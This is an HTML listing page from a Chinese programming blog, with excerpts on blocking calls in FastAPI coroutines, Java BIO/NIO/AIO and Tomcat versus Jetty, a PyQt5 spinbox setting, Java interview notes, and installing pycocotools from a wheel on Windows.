		前言 异步编程可以提高应用程序的性能和吞吐量，因为它可以充分利用 CPU 和 I/O 资源。当某个任务被阻塞时，事件循环可以切换到另一个任务，从而避免浪费 CPU 时间。此外，异步编程还可以简化代码，使其更易于维护和调试。
我们最常用的是同步编程，在同步场景中，某个任务被阻塞时，整个线程都会被挂起，直到该任务完成，所以为了避免整个程序被阻塞的情况，又引入了多线程和锁。同步编程通常需要使用锁和其他同步原语来确保线程安全。
混合编写的场景
在实际开发过程中，通常会遇到同时进行异步和同步操作的场景。例如，在使用异步 Web 框架 FastAPI 时，对于实际的一些业务需求将不得不采用同步编程。例如，可能需要使用同步数据库驱动程序或同步文件系统接口，又或者调用同步接口等等。
在协程函数中调用同步函数 在协程函数中直接调用同步函数会阻塞事件循环，从而影响整个程序的性能。我们先来看一个例子：
以下是使用异步 Web 框架 FastAPI 写的一个例子，FastAPI 是比较快，但不正确的操作将会变得很慢。
import time from fastapi import FastAPI app = FastAPI() @app.get("/") async def root(): time.sleep(10) return {"message": "Hello World"} @app.get("/health") async def health(): return {"status": "ok"} 上面我们写了两个接口，假设 root 接口函数耗时 10 秒，在这 10 秒内访问 health 接口，想一想会发生什么？
访问 root 接口（左），立即访问 health 接口（右），health 接口被阻塞，直至 root 接口返回后，health 接口才成功响应。
time.sleep 就是一个「同步」函数，它会阻塞整个事件循环。
如何解决呢？想一想以前的处理方法，如果一个函数会阻塞主线程，那么就再开一个线程让这个阻塞函数单独运行。所以，这里也是同理，开一个线程单独去运行那些阻塞式操作，比如读取文件等。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e76c5d043126366f8c8c0766992e310c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/605f1232e6ef5878804425220f946a21/" rel="bookmark">
			BIO与NIO、AIO的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🏆作者简介：哪吒，CSDN2022博客之星Top1、CSDN2021博客之星Top2、多届新星计划导师✌、博客专家💪，专注Java硬核干货分享，立志做到Java赛道全网Top N。
🏆本文收录于，Java基础教程系列，目前已经700+订阅，CSDN最强Java专栏，包含全部Java基础知识点、Java8新特性、Java集合、Java多线程、Java代码实例，理论结合实战，实现Java的轻松学习。
🏆姐妹篇，Java基础教程（入门篇），包含面向对象、基本数据类型、数组、继承和多态、泛型、枚举等Java基础知识点。
🏆姐妹进阶篇，Java基础教程（进阶篇），包含Java高并发、Spring、MySQL等Java进阶技术栈。
🏆全部订阅，可加入Java学习星球，完成Java从入门、实战、进阶全方位的Java知识体系学习。
IO的方式通常分为几种，同步阻塞的BIO、同步非阻塞的NIO、异步非阻塞的AIO。
一、同步阻塞的BIO 在JDK1.4之前，我们建立网络连接的时候采用BIO模式，需要先在服务端启动一个serverSocket，然后在客户端启动socket来对服务端进行通信，默认情况下服务端需要对每个请求建立一堆线程等待请求，而客户端发送请求后，先咨询服务端是否有线程响应，如果没有则会一直等待或者遭到拒绝请求，如果有的话，客户端线程会等待请求结束后才继续执行。
二、同步非阻塞的NIO NIO本身是基于事件驱动思想来完成的，其主要想解决的是BIO的大并发问题，在使用同步I/O的网络应用中，如果要同时处理多个客户端请求，或是在客户端要同时和多个服务器进行通讯，就必须使用多线程来处理。也就是说，将每一个客户端请求分配给一个线程来单独处理。这样做虽然可以达到我们的要求，但同时又带来另外一个问题。由于每创建一个线程，就要为这个线程分配一定的内存空间，而且操作系统本身对线程的总数有一定的限制。如果客户端的请求过多，服务端程序可能会因为不堪重负而拒绝客户端的请求，甚至服务器可能会因此而瘫痪。
NIO基于Reactor，当socket有流可读或可写入socket时，操作系统会相应的通知引用程序进行处理，应用再将流读取到缓冲区或写入操作系统。也就是说，这个时候，已经不是一个连接就要对应一个处理线程了，而是有效的请求，对应一个线程，当连接没有数据时，是没有工作线程来处理的。
BIO和NIO一个比较重要的不同，是我们使用BIO的时候往往会引入多线程，每个连接一个单独的线程；而NIO则是使用单线程或者使用少量线程，每个连接公用一个线程。
三、异步非阻塞AIO 1、异步非阻塞AIO 与NIO不同，当进行读写操作时，只需直接调用API的read或write方法即可。这两种方法均为异步的，对于读操作而言，当有流可读取时，操作系统会将可读的流传入read方法的缓冲区，并通知应用程序；对于写操作而言，当操作系统将write方法传递的流写入完毕时，操作系统主动通知应用程序。即可以理解为， read/write方法都是异步的，完成后会主动调用回调函数。 在JDK1.7中，这部分内容成为AIO。
2、主要在java.nio.channels包下增加了下面四个异步通道 AsynchronousSocketChannelAsynchronousServerSocketChannelAsynchronousFileChannelAsynchronousDatagramChannel 其中的read/write方法，会返回一个带回调函数的对象，当执行完读取/写入操作后，直接调用回调函数。 BIO是一个连接一个线程。
NIO是一个请求一个线程。
AIO是一个有效请求一个线程。
3、以银行取款为例，理解一下概念 同步 ： 自己亲自出马持银行卡到银行取钱（使用同步IO时，Java自己处理IO读写）；异步 ： 委托一小弟拿银行卡到银行取钱，然后给你（使用异步IO时，Java将IO读写委托给OS处理，需要将数据缓冲区地址和大小传给OS(银行卡和密码)，OS需要支持异步IO操作API）；阻塞 ： ATM排队取款，你只能等待（使用阻塞IO时，Java调用会一直阻塞到读写完成才返回）；非阻塞 ： 柜台取款，取个号，然后坐在椅子上做其它事，等号广播会通知你办理，没到号你就不能去，你可以不断问大堂经理排到了没有，大堂经理如果说还没到你就不能去（使用非阻塞IO时，如果不能读写Java调用会马上返回，当IO事件分发器会通知可读写时再继续进行读写，不断循环直到读写完成） 四、java对BIO、NIO、AIO的支持 1、java BIO：同步并阻塞 在此种方式下，用户进程在发起一个IO操作以后，必须等待IO操作的完成，只有当真正完成了IO操作以后，用户进程才能运行。JAVA传统的IO模型属于此种方式！
服务器实现模式为一个连接一个线程，即客户端有连接请求时服务器端需要启动一个线程进行处理，如果这个连接不做任何事情会造成不必要的线程开销，当然可以通过线程池机制改善。
2、java NIO：同步非阻塞 在此种方式下，用户进程发起一个IO操作以后边可返回做其它事情，但是用户进程需要时不时的询问IO操作是否就绪，这就要求用户进程不停的去询问，从而引入不必要的CPU资源浪费。其中目前JAVA的NIO就属于同步非阻塞IO。
服务器实现模式为一个请求一个线程，即客户端发送的连接请求都会注册到多路复用器上，多路复用器轮询到连接有I/O请求时才启动一个线程进行处理。
3、java AIO：异步非阻塞 在此种模式下，用户进程只需要发起一个IO操作然后立即返回，等IO操作真正的完成以后，应用程序会得到IO操作完成的通知，此时用户进程只需要对数据进行处理就好了，不需要进行实际的IO读写操作，因为真正的IO读取或者写入操作已经由内核完成了。目前Java中还没有支持此种IO模型。 服务器实现模式为一个有效请求一个线程，客户端的I/O请求都是有OS先完成了再通知服务器应用去启动线程进行处理。
五、BIO、NIO、AIO适用场景分析 BIO方式适用于连接数目比较少且固定的架构，这种方式对服务器资源要求比较高，并发局限于应用中，JDK1.4以前的唯一选择，程序只管简单易理解。
NIO方式适用于连接数目多且比较短的架构，比如聊天服务器，并发局限于应用中，编程比较复杂，JDK1.4开始支持。
AIO方式适用于连接数目多且连接比较长的架构，比如相册服务器，充分调用OS参与并发操作，编程比较复杂，JDK1.7开始支持。
六、 Tomcat（ BIO ）和Jetty（NIO） Tomcat和Jetty是目前全球范围内最著名的两款开源的webserver/servlet容器。
相同点： 1、Tomcat和Jetty都是一种servlet引擎，他们都支持标准的servlet规范和JavaEE的规范。
不同点： 1、架构比较 （1）Jetty的架构比Tomcat简单。
（2）Jetty的架构是基于handler来实现的，主要的扩展功能都可以使用handler来实现，扩展简单。
（3）Tomcat的架构是基于容器设计的，进行扩展是需要了解Tomcat的整体设计结构，不易扩展。
2、性能比较 （1）Jetty和Tomcat性能方面差异不大。
（2）Jetty可以同时处理大量连接而且可以长时间保持连接，适合web聊天应用等等。
（3）Jetty的架构简单，因此作为服务器，Jetty可以按需加载组件，减少不必要的组件，减少了服务器内部开销，从而提高服务器性能。
（4）Jetty默认采用NIO结束处理I/O请求上更占优势，在处理静态资源时，性能较高。
（5）Tomcat适合处理少数非常繁忙的链接，Tomcat的总体性能更高。Tomcat默认采用BIO处理I/O请求，在处理静态资源时，性能较差。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/605f1232e6ef5878804425220f946a21/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/953999937d394e870873713c74228fd9/" rel="bookmark">
			pyqt5 doublespinbox解决输入限制99
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		只需要将doublespinbox选中，属性里找QDoublespinbox将maxinum改为想要限制的数值上限，另外mininum是更改输入下限。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/74b7d0dd9ac268db0dff99d553db0c83/" rel="bookmark">
			剑指金三银四！汇总Java面试突击班后的面试小册
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近很多同学已经成功“拿捏”了今年的面试，好多同学给老师说，2022最新版的Java面试突击班的内容给自己提供了很大的帮助，在这里很感谢这些同学对老师的认可，老师会持续奋战在Java教培的一线，了解最新的技术并且提供给大家学习！
话说回来，今天给大家分享的就是咱们2022版面试突击班的文字PDF版本，如果大家需要视频版本也可以一并送给大家的，下面是文字版的分享大家可以详细往下看！
由于文章的篇幅有限，所以这里只为大家截图一些大标题内容，里面详细的小标题内容就不为大家截图了，等大家自己拿到手之后可以详细去看和学习！
大厂Java岗面试经验篇
面试官：兄弟你来阐述一下Spring框架中Bean的生命周期？
JAVA篇
RPC 远程过程调用可以说是分布式系统的基础，本文将通过 Java 演示一次普通的 rpc 调用到底发生了什么。
一文看懂 HashMap的红黑树实现原理
容器篇
Spring源码篇
前几天有一个同学去面试一个还不错的公司，因为一个Spring的问题，期望薪资三万却被生生的压榨成了两万五，高于两万五人家都不要，让我感觉到了Spring的强大，不学习Spring是会吃亏的，那么我们就从各种高频面试来一点点深入吧。
SpringBoot源码篇
Spring源码学习完之后，就可以进行SpringBoot和SpringCloud的学习和提升了！
Spring Boot Jpa 的使用
杂七杂八篇
原生线程池这么强大，Tomcat 为何还需扩展线程池？
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2495f8135d05b446f577ea1b71e11db7/" rel="bookmark">
			Win10&#43;Anconda安装.whl文件到指定环境——以pycocotools为例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Anconda安装.whl文件到指定环境 1.Whl文件2.pycocotools安装 前言：本篇文章主要记录了两个问题：
（1）Win10环境下，利用Anconda安装.whl文件到指定环境的方法；
（2）Win10系统安装pycocotools，pycocotools这个库官方不支持Windows系统，因此直接在线安装一直会报错，所以先择.whl文件安装。
1.Whl文件 Whl文件文件是以Wheel格式保存的一种Python安装包，适合离线安装。
2.pycocotools安装 通过pycocotools的安装你将熟悉Win10环境下，利用Anconda安装.whl文件到指定环境的方法
第一步：下载pycocotools-windows安装包
下载地址：https://pypi.tuna.tsinghua.edu.cn/simple/pycocotools-windows/
选择合适的版本安装即可。下载到一个文件夹，例如E:whl\\pycocotools
第二步：激活你的环境
conda activate your_envs 第三步：进步pycocotools保存的文件夹下
先cd..退出C盘再cd E:whl\\pycocotools进入目标文件夹
第四步：安装
pip install pycocotools_windows-2.0-cp37-cp37m-win_amd64.whl 我这里安装的是python3.7+win64版本的
如下：安装成功！！！
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/69/">«</a>
	<span class="pagination__item pagination__item--current">70/220</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/71/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程中国的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>